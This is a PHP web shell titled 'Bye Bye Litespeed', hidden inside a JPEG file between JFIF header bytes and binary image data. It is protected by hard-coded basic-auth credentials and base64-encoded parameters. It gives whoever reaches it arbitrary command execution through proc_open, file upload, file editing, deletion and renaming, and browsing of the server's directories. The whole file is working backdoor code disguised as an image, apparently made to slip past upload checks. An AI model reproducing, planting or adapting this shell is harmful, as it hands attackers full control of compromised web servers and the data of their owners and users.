���� JFIF      �� � 

	

  ##3($$(3;2/2;H@@HZVZvv�

	

  <!DOCTYPE html>
<html>
<head>
    <title>Good Bye Litespeed</title>
    <link href="https://fonts.googleapis.com/css?family=Arial%20Black" rel="stylesheet">
    <style>
        body {
             font-family: 'Arial Black';
             color: rgb(255, 255, 255);
             margin: 0;
             padding: 0;
             background-color: #242222c9;
             text-shadow: 2px 2px 4px rgba(90, 88, 88, 0.5);
             background-size: cover;
             background-position: center;
}
        .container {
            width: 80%;
            margin: 20px auto;
            padding: 40px;
            background-color: #1e1e1e;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .result-box {
            width: 97.5%;
            height: 200px;
            resize: none;
            overflow: auto;
            font-family: 'Arial Black';
            background-color: #f4f4f4;
            padding: 10px;
            border: 1px solid #ddd;
            margin-bottom: 10px;
        }
        hr {
            border: 0;
            border-top: 1px solid #ddd;
            margin: 20px 0;
        }
        a {
            color: #ffffff;
            text-shadow:0 0 6px #000000;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #5c5c5c;
        }
        tr:nth-child(even) {
            background-color: #9c9b9bce;
        }
        input[type="text"], input[type="submit"],input[type="file"], textarea[name="file_content"] {
            width: calc(97.5% - 10px);
            margin-bottom: 10px;
            padding: 8px;
            max-height: 200px;
            resize: vertical;
            border: 1px solid #ddd;
            border-radius: 3px;
            font-family: 'Arial Black';
        }
        textarea[name="file_content"] {
            width: calc(97.5% - 10px);
            margin-bottom: 10px;
            padding: 8px;
            padding-bottom: 77px;
            max-height: 200px;
            resize: vertical;
            border: 1px solid #ddd;
            border-radius: 3px;
            font-family: 'Arial Black';
        }
        input[type="submit"] {
            background-color: #128616;
            color: white;
            font-family: 'Arial Black';
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #143015;
        }
        .item-name {
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        td.size {
    width: 100px;
}
.date {
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .writable {
            color: rgb(13, 178, 2);
            text-shadow:0 0 7px #000000;
        }
        .not-writable {
            color: rgb(216, 9, 9);
            text-shadow:0 0 5px #000000;
        }
        .permission {
        font-weight: bold;
        width: 50px;
        height: 20px;
        text-align: center;
        line-height: 20px;
        overflow: hidden;
    }
    
    </style>
</head>
<body>
<div class="container">
<?php
// --- pop-up

$user = "290802as";

$pass = "290802as";

 if (($_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass))

 {

  header("WWW-Authenticate: Basic realm=\"dvildance was here\"");

  header("HTTP/1.0 401 Unauthorized");

  exit();

 }

// --- php shell 
$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);
$rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
$scriptDirectory = dirname(__FILE__);

function x($b)
{
    return base64_encode($b);
}

function y($b)
{
    return base64_decode($b);
}

foreach ($_GET as $c => $d) $_GET[$c] = y($d);

$currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
chdir($currentDirectory);

$viewCommandResult = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
        if (!file_exists($newFolder)) {
            mkdir($newFolder);
            echo '<hr>Folder created successfully!';
        } else {
            echo '<hr>Error: Folder already exists!';
        }
    } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
        $fileName = $_POST['file_name'];
        $newFile = $currentDirectory . '/' . $fileName;
        if (!file_exists($newFile)) {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                echo '<hr>File created successfully!';
            } else {
                echo '<hr>Error: Failed to create file!';
            }
        } else {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                echo '<hr>File edited successfully!';
            } else {
                echo '<hr>Error: Failed to edit file!';
            }
        }
    } elseif (isset($_POST['delete_file'])) {
        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
        if (file_exists($fileToDelete)) {
            if (is_dir($fileToDelete)) {
                if (deleteDirectory($fileToDelete)) {
                    echo '<hr>Folder deleted successfully!';
                } else {
                    echo '<hr>Error: Failed to delete folder!';
                }
            } else {
                if (unlink($fileToDelete)) {
                    echo '<hr>File deleted successfully!';
                } else {
                    echo '<hr>Error: Failed to delete file!';
                }
            }
        } else {
            echo '<hr>Error: File or directory not found!';
        }
    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $oldName = $currentDirectory . '/' . $_POST['old_name'];
        $newName = $currentDirectory . '/' . $_POST['new_name'];
        if (file_exists($oldName)) {
            if (rename($oldName, $newName)) {
                echo '<hr>Item renamed successfully!';
            } else {
                echo '<hr>Error: Failed to rename item!';
            }
        } else {
            echo '<hr>Error: Item not found!';
        }
    } elseif (isset($_POST['cmd_input'])) {
        $command = $_POST['cmd_input'];
        $descriptorspec = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = proc_open($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            if (!empty($errors)) {
                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($errors) . '</textarea>';
            } else {
                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
            }
        } else {
            $viewCommandResult = '<hr><p>Error: Failed to execute command!</p>';
        }
    } elseif (isset($_POST['view_file'])) {
        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
        if (file_exists($fileToView)) {
            $fileContent = file_get_contents($fileToView);
            $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
        } else {
            $viewCommandResult = '<hr><p>Error: File not found!</p>';
        }
    }
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $target_file = basename($_FILES["fileToUpload"]["name"]);
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "File ". htmlspecialchars(basename($_FILES["fileToUpload"]["name"])). " telah diunggah.";
    } else {
        echo "Maaf, terjadi kesalahan saat mengunggah file Anda.";
    }
}

echo '<center>
<div class="fig-ansi">
<pre id="taag_font_ANSIShadow" class="fig-ansi"><span style="color: rgb(67, 142, 241);">   <strong>  __    Bye Bye Litespeed   _____ __    
    __|  |___ ___ ___ ___ ___   |   __|  | v.1.2
|  |  | .\'| . | . | .\'|   |  |__   |  |__ 
|_____|__,|_  |___|__,|_|_|  |_____|_____|
                |___| ./L4yn.ID                      </strong> </span></pre>
</div>
</center>';
echo "Zona waktu server: " . $timezone . "<br>";
echo "Waktu server saat ini: " . date('Y-m-d H:i:s');
echo '<hr>curdir: ';

$directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
$currentPath = '';
$homeLinkPrinted = false;
foreach ($directories as $index => $dir) {
    $currentPath .= DIRECTORY_SEPARATOR . $dir;
    if ($index == 0) {
        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    } else {
        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    }
}

echo '<a href="?d=' . x($scriptDirectory) . '"> / <span style="color: green;">[ GO Home ]</span></a>';
echo '<br>';
echo '<hr><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
echo '<input type="text" name="folder_name" placeholder="New Folder Name">';
echo '<input type="submit" value="Create Folder">';
echo '</form>';
echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
echo '<input type="text" name="file_name" placeholder="Create New File / Edit Existing File">';
echo '<textarea name="file_content" placeholder="File Content (for new file) or Edit Content (for existing file)"></textarea>';
echo '<input type="submit" value="Create / Edit File">';
echo '</form>';
echo '<form method="post" enctype="multipart/form-data">';
echo '<input type="file" name="fileToUpload" id="fileToUpload" placeholder="pilih file:">';
echo '<input type="submit" value="Upload File" name="submit">';
echo '</form>';
echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form>';
echo $viewCommandResult;
echo '<div>';
echo '</div>';
echo '<table border=1>';
echo '<br><tr><th><center>Item Name</th><th><center>Size</th><th><center>Date</th><th>Permissions</th><th><center>View</th><th><center>Delete</th><th><center>Rename</th></tr></center></center></center>';
foreach (scandir($currentDirectory) as $v) {
    $u = realpath($v);
    $s = stat($u);
    $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?'.('d='.x($currentDirectory).'&f='.x($v));
    $permission = substr(sprintf('%o', fileperms($u)), -4);
    $writable = is_writable($u);
    echo '<tr>
            <td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td>
            <td class="size">'.filesize($u).'</td>
            <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', filemtime($u)).'</td>
            <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.htmlspecialchars($v).'"><input type="submit" value=" View  "></form></td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.htmlspecialchars($v).'"><input type="submit" value="Delete "></form></td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.htmlspecialchars($v).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
        </tr>';
}

echo '</table>';
function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
    return rmdir($dir);
}
?>##3($$(3;2/2;H@@HZVZvv��� �R! ��              ��     �P                                                                                                                                          ��G��            ��2�����gb�:�          �������f�~0�����           v�i8s.�����ό|('˵߀          w:����y���n�8�ڻ��1�         �s ��V���t�F�I-�eƾ_�c{y�          ��l�}9�̽�ҩ���[������s��          ��\_K�e{��<�<j� ��Z>���^          M��*w��%����A��ÆD6�l�MP          ���[u�/�W�_m^'8�]���� �\/         �����n�6Z�1��V���	�7����          ��2�YY�E[��ِ*Kcm)�nL0          ���h�?螚xw�������vw��          gZ?JT���o��b�k=�n�����^{.t<          =l��������#��cM�� �/a�          s+���^#���lJ?6��+�.�����j�          9�� .#���["Ԯ�M��Ū5y�>y�;]H          O�����Y��lzH�xv�$���          �����(n� ��M�k�����?�x          s����oL-FW��+����潔�         s���j5�9v�K��Ȃ�0��x�4�M          �ҕ|sQ��xC6����.��f��6          6L�ګ��
�X�|�\;��^{��M����8          ��g�h�����ǌI�����<��Įjo0         	_��+�W����?�Z̾a��}fI,������         fZ�ދ����Wؚ��W@[�ו�G>���M��         p]�|^��m��q��yF^}u6�ڼ�i,���q��         9�>��´U��O�$W�k���|�vEq�g����         e��'��:]�4nE����,��{#�.|�M         ;�˶�틍�\z��-->.����E�Y�
>GR��         缯�� �������)XU�W���1���1� S��#          )�VǱ���������m��^Q���-�Uee���         ��+d�;�|�J���UTo��[��[Γ�g�         ��O��f��� ����8n�s�[�]C@ͫ�          ;nz�#���v:.���֎i������w7�<          {;m������~�����"�|َ�az�>�         �<I#޽��� U�iӐ?�,���n�K���          {��������i�4}{��^�㮉��H          ���x��'�TG/��)���          �w��{-��y�                                                                                                                                           ?��             ��                                                                                                                                       k|�      7D|�s     �!�n��     �2�n�      ���W��     ���>y     ��È     f�      �D                                                                                                                                                                                                                           ��             ��                                                                                                                                       B�     ����     ǯ.�     N};��      ���     �t     �n�      r��     <w                                                                                                                                                                                                                           ?�� 0      `!1"#2 3A�$Q��   � �f�ς����az��E���ˌ���j��ok�~� ��G����ԍ�Ҍ~�
2ݾ���$�m~������ɖ�=ϓ[V}[�ю�V��u� �X���vi�{��[��� �rښf����OhB�y�s�ְʘ��R�W�~��錕��O��t�~�E�旺<��F�	z\v���~L�H��33� G+ɽ�5J����;�H��_���i�ײR#-��\ښ �	���5��y�� N��(�/{��k^o�o}ڄ<g�4�)O�O?�X���x��fi11>���S3�'Ƈ��j��h����2l�=��� O_���	2B�Hţ���3G�_,�3-�Y(����9ZD�M�
��X������Q�/!뎹�'w}�����W��~l�v&�n�Yը����b���t�-W!�J�0|ح`�p�'(M,�����$����5@�%`1PĮ�~��!� �������b?o��e�i�G�i��U�ZBV����&��f+� ܏��)�&�  �_��?�k��o6�.�ąf������W�jhv� R��̹�t��;�}��*�Wf&���U~�BǷ��?�>E�<�-�`R�Я3VeP�@`_�*���D�1�����E����n~-)�>� o'����O��O���	0�o|o���G�3V��K	�s4tEQ9��A�T��KM��P���1����O����X�rʭ".�uYvh�2�w W�̽�g��~p٧���~i�H�c�+��� 5rt��1�T�`/����V�I[� ���� ��>v����SLW[]���J� =��dm�����Z�6{D�^���5u�J�`d�@�E�z�����y$2_�^=�qeWb��R�᧩]_���M�����\潪Z��!f"�W�ȴ�fikV}V|E7�'9��A����_۴�����b ����f~��IW1�E�A��:RĴV��l�*��VXz��ޔ=��4�}>+ۚ��}�.>C�)N*��\Ps32���ۜ�P�.���n�f��A���6�@��)��Co�l�F���$U�]`W�LLO���y~WC�����c���c��R�D�O�?�Q��Mg�~�����ꙟr޻Q�ZF��$�>*�u��� 6}�z2O��Umz�
��B��w�tv�n�Cv��/!�E<� {jV���\���-��jS5�}v�ؖ��ڗ���2������W7�G����g��$L�,c�����q��Z��K�2h�{6�����y��!�� my��1�ӫ,�e�����g3��M����q(�h�ʺ��U�uŴpވ}�-�I�m$��b|�=o���m����������|�?fkqO�䨚���k�c�\:-��s���.vP��2TA���P�7'ٿ�dCMg�*�hG2��'?��r�V_����F �5;b8��0T���z�+ڭP������+��'O^^bm>��!�D�&���-i�/x��,�.������� 3���W���+k�GB�x��E tr�`蔗	�B�Ej��a�V��k"�7d�T)�lR�:������g!+5HWڅ���C�� �����U���13�Ώ/��MR���+3Y������􃎢���M�ߊG�OO�+ʦ�5A����=w��mi��}9�M���\.ܢ�-��t4z�Q�Q�Rp^]e�0�qa='/JYP���5��}@2t�=#;����1~����$��V����ţA��w�?���V����Đ�扟�G����q������R��h� �m��Z�̈́�؍�,��"-І�Nݐ������i �ic8�,E��S:��T�SHN(���*��K���q�NQ����� @��r��-���*��v���o��|��&C�Y��~>��u�0��m� ����mw���y��	M��#ie���Bf�(fIO1t���(���ч~�?�������A�����2�L�r��"�Y��~*��g�5�j^~�[��:�s�\z����W'F�:+9^�������K�O��a��G�{��F�Kh����K��(G]��	���!e�&(t��z��^����C5�^{a�A�<B�'�l�i0X�5��@����w�?R"e���'=f��{���=�:䳟��&�"�\�?��M�XM����:;�,|UǞ� ��.mi��o����1�y�M�]���.��M��o�Zז��F�izKzFdp*���R����w�����"���EX?�m���'E԰�imj/z�M���9�)+���y'.�&�EAM\�"�����M'�!!H�>`��]� ��BȮ�;�b�\�wdW.�w=hob�:���UP�~�8�t1�rX���ɏ��Mg�|���o>O͕�B�[�X'<~&���
�P����;�G�ȭ�"�c�� {8���2��0L�F�0�r�S���̖����k�Z_�^ȋP��.�7�<��:Jʹ&g���%)�b<��|���+y����y�Q��9���䦽�/a ��wۿ��K��h8�����/7|�+~�^ݪS������K�d��nJ�V���_ �'��ċ;Q�T�^��Z���U��&j^� �=&���y�/ZRf"m3�oKR+3�띢�!�\޷�����cw���N��s?�,/�p�˫835��휳Ǟ�@�fb�;���W���H��I�Or�:��M������a����~:�,��tB
E��z̃�!���.6��~���WT�J^io�_s1�E�ʂM��6�+�!Ync���7�I�N��\���Ah��������qyX��5��P�X�nh�7�T@�8�]���V�}Cg$/���4���e����h[ mp�v���h�M�^�%�9��������;E�{Q8�/s�,�KZ�^��o�?9�!�-E9��;U����s�.h5mE�P ~H������ޱy����5'�XW���r�~���)��"LO�	,~A�/���Q�`�f�y5�c]y�ޢ:��,��a����'7I���� ����7� Zx�Y������;�����u�����5,�&G�\���S�s�1�x�C>ag-�<m,�ܖ[3�&���:��c�iX\�'k�O5G#�y�~��l5� :�E���t����x�"2�H��8	�1ڵ�& s:�YƲo�&4���M�6�e�r;;8lh�P�Y�����k[i���N�S�J�Ṵ���D�xI���ἌF[�_V�YTno�\���G~�w��=kt=_PvyV̓T�{�8���������䆍���6Qro��z��1���������J���ܦ@n������u��I4X������_Q�&A���&S9׍H����� 6,	6�L�C���=�)E�}͛����%o��vJ���5H�"�S�����ܧ�\����0E��W���nk���;�ژ]�/B�d��[�����s> s����sJON[�����#������[ 6�w��X�|y�w+V��W|�fV��K1�`���m���?D���\� ���:,��t9����W�r�������RR�\��v��8�i�0�]5��5���1���2�5�3t_l,�w3�������';�/y�l3K�2]����&8|zi,�)<N��T�=T����-����|'�^ǝm���s��6��3�U7;����`m�{w������ �,3D���pG��7,l�rˉ�Y4Ɠ���� "�v�<��s=5�U�S#s�A>�^�3ť�XxN�� ����)�8����s�س;n巶��>l78������nq�3z#�f��x	y�� :b�_F�&�B����
^ԵmlRL��Ӝi����x�nQ���bШ��Tq�G9N�V���b9_�y`����:I��ҷ��4"�N)��ޮ\:.������o>�]s_�e�Z�����K�����^�5����(�E�a�e�����u�� �YG��-�?1���������?����Nr���S��:�:%����z)��Q=>�*]�âo�3L�(����!K�!ڡ�x2�����z#��8��NgS��%�¬ug_?�C=;Th
Ԝ��������� ^-��V��!r��6����d�<W���,�ZJ�Z�77��)3�t�E�Y��~Ӂ��Y-wT�q� )�>I������I�n�{�Ǳ>#�f2k�̸�,O�1�n�Vc�,���~��B�C,�$�f��'�RGh���00i{�`�#��/�����M�7A��V�K��'��	u�� Dh��L"���j<k!Wyb�^������J��w�ϻ='�R��������� ��O��
�G�u�j���@�%��ƙ.0*-TH�]A�k �����Eu�v�G��S�Z����ސL,�h��Q�Q��3�([Z��Z&'���w%���:-�/�r�}{~�A0n�A�q�eO��������Qt��>�.�L� ���D������5��yډL�V�/���o�X=y&��K����DU�*ҍn�AI~�}�9SGG���j�ƫ'e邶�/��z��g艉�[���iG����y\��;�O�����0��NN�;�[���"�������3�E�߉u�S��,E��{ث:��ڀ�PV��D���� Ai7���֥E��&�Yp���k�Hb�ޟL��k�&�K��M}p l��-�dM���z֢������
ٷk�@È��e�J0`3�#ߺ^z޻�(h�rhs�>�{�B�`D{�PV�^&I>�����~3KlgQ�W�0I�Ȋ�z��f� N� ����BE�*�S~�ω�isb|sA�3�#YK4�����n����9�^�V��/=�.���VFJ?����o/8�)��rT�\��C����?o^�Y�3�chMSzs�,�O� ��ͨA���'�Z��Zb�7�W�(��.Y'�_ ��Ҋ��͢fi�\�}�7Ӑ��U�QkA�Zf�o&|�^��C����xm��J�+1��g׿"}{�__LǗ��G����Lz������鑎�<
�%��vKR	o:�\(�M-�!�K]'2��G��z�F'�{�g�TG��LLz���O��r8����>���� �@�7(/�E�A��U�0_>�� ч�� G    !1"AQaq2`#BR���3b� $r����4STcs��%���Ct���  	? � ��4�~!gb��U���f��e��9��Kh��$*X"�.��3HR(Ƙ�ի@'Q߼�ri�N8�i'����QLM��@�y��Ia8Pyђ��KI��l)D��������oV���TEʕcĶA�A$���,Q��g���I�h�� i]?�Z�8q���>��,I�)�C�����!��}�w﨑<��ߛT�s״h��ǣA�+��uA�Z�a�t�0�
#
�\_�J�����%6�Fɷ��т�?�Ԟ���Z��l��[�-JC������|�
8�[�p{^o���-X�ӟ�b�U�c�� [P�����*ˍ�(p�ޔ<��-dI�{��F����
�;�1f$�I�$� B��PN���Q�iܔW������QA=Ku {���ϰ~t�85�ylz���Wl1S�pA����)�AH� iL���4v0�J�u��������(�Y� �/#gC����/5��Ǉ�p*�1.0yg}�_ĈcS|O�M;ޖ�G�jK�d�5��@a�6!=�Aq.�Y#�J���]�J�N�5l�O><zL��}��udk+~)�*Y�T��%5ş)c����M�h�I�2�m�M.75;�,L��А:��ĸ�2��J�l��w$P��!�<�Llp�}���p#��H'����p[�>'ki��s��V|9h��,�:���M��n���mk#v���Y:�i�6^g#�����O7�?���ު��f��o��_���D����a�+��H����NZd�c
���wQ	,��U��S� .����=D�J~W�m����q��������aެg������^��p�� 5��/8&��n+��[u�YR�/��X՗��8Cpˑ� z5M=��8�b4c���1�����$�r�
�,.�K�� fs�ҷ��04p5���������H�(� tt�C�z�h���2�z8>#�CN�s�)9tc� (݆I��U���]>�� ���p���q~d�?�F��0hr6v��
�(�FX&���} w��S,60I8�����X�O��f�����ۉ���H��Ux�a��2�=����!�M�'6�ϜD��ul��tD[\3�� /��C�����V��>^^+D4Rq���h�S�֗ZK��=[NF<E>��8]񗍶�c��|�H#��.# (z:.s����ocj�?�`?#QB����]�Kim��ń}� mF���Qᓰ�V��	�'(��^Z�������7�%�^v����j����	��e��Q�[_O�+�ܯ�ͺT�����7��Q��ɚw����o�ڵ���տ���� ��~��x��X9�RȮ��e�uղ�� ��� ��Ԁ�Q�L�eضr�١�H�G�4�2HT�q��#�Ɣ�e�@bA�	o���U'���t=T��h�YQʑ�<����K��<��ȒF�h�i��Ԡ�:kqY'��� ���Fܭ{o�擟��2�CΤ(�g�����āQk׃�e�l��q���#+��s�{�ȧC���3�Z��q��N�O)�ᵖ�+��MH�c}�6ǘ���=냽wӲ���T6�d�bjէ���63��~-�W��ja1��,ä�J�̿�Buf�j8�>�M�YA?ΰ!�@f���r�3���C�U�A�y���1  2I5��~�b�v#*N7��Wq� h�R|n�(���.%X!��9�{o�d�@7&K?��N���]3ܱ�:�9k��[c���J ]���~��A4Y9<�\�v�1����ߠ� u� n�n��h_t'�J	 �ƪ�q=��U��4��@�>����+�ܷ���VS���r
�'5d�L����P�bO]&�8��Dm&R�'F��rX�Vb(��#��̑��Q��[8��Ѳ�k�z��
��-[�,��D��R�o�q���0s�G���4�ᒱ�E�,��I0Z�¼h�
�Tm_�{?}o�)7h�` �8�ğ�\K�}��w��Q�����R�,}M,k
��b0=� ԡ��O>�F*��N��>J����D���N!��A���������#�8'#7u�kV+��H.}�KW�a,N�o1|�#d4���Q4���Z��b����l�S��
�U� C��x��K=����k\����{���Q"���sٍrT�-X�b���$W!�1»��T}�oG.vP< � �<�?qȇ��
�� 6����dwKjA� ��ߗ:��"������ԱP��T� �֢�����Թ��|�3αp>�0j�b��;�EX/�/�Xm��+���OͳE�+�X��ή��hͷ :�u|f:�9�C�$��.!�(������PqQ�i4#[�6$]1�T��P%ď�H���k�xnNEp���k��X��Hn�!4�x-p���K[�D��Kp�>)Bǐ�u ��k��\f0[(�U�Q'*I U��A�%�L��qY���D���n5|�c��=6Z?��[��9x������Mv�GmKlpq���+�Щ�!{ҰK�g%��Β:�u8e�Ɲ�:v� S!G+I�H�=��*�"�"	�\\���]d��(Nq��w#a�R<wb왠��E@ʻ�ؓ]�����ŋY����(�mZC�
�	!�k���5jR9o%�B��uh#*z�+��uok*@�l"��˺>DۦYjIݛ�H��JH`L�H&��)yz��=H4�x�҅�Z�U sF·g��g8�k�lT�_ߦvPrC@�	_���P�w�}�Z#b=�wPGQ�~���IO�%O�8��_>���8�Ϳ$��2�ʝ�~{U�����j��<i���~xH�?��d,`I"�Gm��3��@�*o�s����SpfM���AK�Z8�R�^ip� ݪ�k;�dt���dOu�Cs�Gic@0t�Xm�u��JbIVS���rO��Ks4p���m��c�J��P�벉 ���𶠵��t�K�*�J�Mv�ꎀj�2Uh�e�9Y��Ӎ* ���@J�*�'�}�+��U��P�Mo<�A$FEmF8��,c�[�#�k\��T��-]�q
�l��V����v�w*)?�q�#pѷ�����^�ⱇmk��~��}����5��H�'�S1�F���g`O~ʼ6]o��
0�!帗�v#�p�~rs�I����N0%�({��9�e;�U�P�D��9�s���噃�*�����R �Ul�T�s�Q�P�����L���C�1�U��z�B8����9�K6�+vEur�T��;`�
��Ş[�i��P��'�+�T)'��0����n�W`��V�L��cC�W`框�^2�`�W=�8�cQ{��tl4����W�ۨQ��8se�S٥��4���n���3���z3�NY��3�Iܒkg�����ȄU�跂@��(#�|]�=�ٌ�
�d��=��ƥ��ue\g9���Y�c����	uD�j�G�0�<x+"��K�H;ڧh8_
��? �ç#~�B�
��(x&B�s�F>�H��M�꒾[1�z?<V�]�r��I�'��S���鏻����G� �]"^����ăQ��ȮkHU_N�N@'H�#�ѕ��^D�mӪ�f,H�XЊ'���Ʈ7n�^Y&:����z�a
� �����ۥpۉ���<�+��� t�m@>�9/���5hX�5�I���t2I�Pǻ��zK���0p��#�w;/���c��p��äK��u���e��L�6bs�S�N�E4���]AW��q��:�Q�;rÕ��?X�N�	���'*��1�`�Zx(����)p��c ���!&3V�)ԙ.� �mC"��:@@������}�HygԲgu�#B�mָ}��l�[B�����+�?��m��|��*�����<^��_� ^���j�I����,�]ݛ�1m�?��iR4�rVLrĲ����G�4���6�ѫ�Eё��3|��sL�L�+S]�;8�?+F�r�-���vdo&W��h'Iz<R��`|tt�'f�yАA��3���7Ŗ��}����5osm4G+<,A_0�PAs,�2{�1����Uq���ў̻b4x�1o,"�"Yɬ,>v��A\
���#U�� X�Ee��]6Coce�i�qN!w�,����CO������0��Z/}u�*��M$gǷ�O!W�@'�mXI(#�댬b�TBI d����(������)�-�e�(��g_���Q� �ԁ��\����5�:��:I��L�;�W�1�.��QʟvE;0���^��$�s��P��u݄��Rc ���`��{�#�L1�:��m_G#2�]@�%h
�tGuS\?�C�4�?��ߗ�õ�FjX� ��&�Wf��D�W:s��_�d���n]�6ꌬSKkvт+����x�F���E�q�m ���� 	g�p{����o�~!��\N[�K����l���dq���(�㶶��O�g%ϛG!�$�	1�j?�]�)�~��r�<�l�����d����R���]t��R�t2�B�M!¢�WQ�X��1�h�.��k��� x���� �#Үg��9P�-�0��O��^@�_C�Y�������B�a�`� �x�?���.#u	���W		W��GV��[K76k�2�"Ħ����1۴�#��
��Z���k�#��d��	U�]�6������R3,���.�9�qk�%��� ԍ#�VrY��>��Ƈ�������<4�	�	��	*-@�+x�aH=w��>T�KG�Q�.���%w*�#�}cIT�9�&�[f��QU6BH�8�ռR5���/���T��U�k�l�E?Qf,wlդ���*Va�˸e6$���g��x�T�b%B�8����n�dD��cʍ�K�~ j����%�уp�c�eƴc��F��U���k�ዢW��7���m:c���ql�O���-T1\��f2����2�s�\+i��ߪl{�*E�>���HR�EX�)wf9bza|���C*��H?)���x�"�K��+�q�z�%�'-��˃�<��)K?s }�ؚ�[�ss��r�c��+��H8�x8&�	/�V���	�W8%N0<A�I?"q$/ʘ����&T�]�����V"6x��`�e9�����ˇ��V:�}��k��qh��Ǐ�q�$Jk��"8%u�I����Q_I8�>�=�9�ޮ���@�ƬʭR�)�y�@cP���D�H�
�2M8�ڶG)�(.�j�E����4m��&M���<n4������rzGY���@,N�O�]��3I�a-�#�86?��I����I�^D!�UKjp	�F�ۉBt.Cde��X�o��᳻�G9�F�F�TZn8|��F:Df���dW��+B��<rh%yE�� }	S�S<D�f{�y�E����XV���5,ˣ,bTm)��U��K�ي� ;���nf%(�$��*Ǡ�o�MY�Ò�+�y/�6�����aB��g�f1�	0U ��8#�I&��u#��:�Pȴ�k�{[���ǋi�6�����0t(F�
��m�񃖗rU��*ۿx.#+�4���8�*)��QN����.% v� ��_o��8'q�k_|��}��Q�G��pd��@~�VN*$_xQs T�5O��=ۚ����)r�J��.H�87����f>��7�+�L���2��$���j.�VL����w=�>>�,����P����L��iB\H���i�(�#���1�|6���Z𪱤�r2�x^���H�W�q��q���c�T��L:�) �Lp[^K ��uC.�P�3�Dw�sq&��3��k��L��;x5�Y����[p(�x�1g�»ۡ`ǝ.�J��:EZ76$E�el!1��e;
�e`��m���$��Q�U`��i:�r��U�(v
.54��M�Ⱥw`�n�A�����-�7|�z�+V��m�H���x+n���b!dq��|T�������[�s����	k{�=�}܂����3���� �D�)]��}"��l1��5\�g�bi�*�L���J������>�cB���K���ݜo�t���[U�E~lX�\�)v�U$C�a��]z��2Mb��59Aٖ�B6&p���R)�8��60�/�:5*����	1��}�eB�d|vjK������ē��׸iLxo4�ݨDEL�]ErO\�[�]h�A�P�pgr[�+�G�D�<OĹ&im�#�ap�6�޸\�H����v�����$u6�2Ÿ(�P����;�$mX�#�q�a��B'hn�$*C��AI�
�|c���uY��+t�R�W?~������;�IB����H��/or��Í�x�o��Y)"����1딍l�7	�
y:S	\g��A��?��&ڹS�4l��]M9ya��'cմg�7Ǽ�t��$V�O��I��W�T[�aO�蠞?]��-,o{ �Td���}���j��:��ɷ��G� ]JIR$���DE;��a�2�9K@��I�j�p]��V_�q���uu�r��X�.��y!հ�K���{1ަϧ���S��7V��� �mMs+:�x�(�ڎXU�Egі�	������v'&�E��(���ܦ��"���p�� �
����k8F	bԂEWK� �#4Vk-��q�4�7'5����`9�HQW���D;��ۈX�-��+�j��N��[H׈F�q<+��á>5{��߲�  ����B-Z�t\=xW�4���7?ۍ�5����/�&C�X�0��KQ�խ�B��Ǽ��l�����3Oj��R�C�++`�ք58��HCٖ;x�����YZ�m������M�X��U�a�G$��q���̠G�L;��Βg1^�+�C�������v
